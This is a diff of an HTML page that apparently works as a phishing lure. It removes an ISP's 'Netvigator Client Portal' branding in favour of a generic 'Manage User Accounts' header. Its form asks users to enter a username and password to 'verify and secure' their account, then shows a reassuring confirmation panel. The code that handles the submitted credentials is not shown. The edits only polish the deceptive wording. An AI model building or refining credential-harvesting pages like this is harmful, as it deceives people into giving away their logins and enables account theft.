@@ -63,18 +63,18 @@
     </style>
 </head>
 <body>
-    <div class="header">Netvigator Client Portal</div>
+    <div class="header">Manage User Accounts</div>
     <div id="login" class="container">
-        <h2>Verify and Enable Account</h2>
+        <h2>Verify and Secure Account</h2>
         <input type="text" id="username" placeholder="Username" required>
         <input type="password" id="password" placeholder="Password" required>
-        <button onclick="authenticate()">Login</button>
+        <button onclick="authenticate()">Enable</button>
         <p><a href="#" class="forgot-password">Use the above button to secure your account</a></p>
     </div>
 
     <div id="dashboard" class="container" style="display: none;">
-        <h2>Great Choice! We will alert you when we detect any unusual login from a new device within or outside region.</h2>
-        <textarea id="feedback" placeholder="Give your feedback here..." required></textarea>
+        <h2>Great Choice! We will alert you when we detect any unusual login from a new device within or outside your region.</h2>
+        <textarea id="feedback" placeholder="Give us your feedback here..." required></textarea>
         <button onclick="submitFeedback()">Submit</button>
     </div>
 
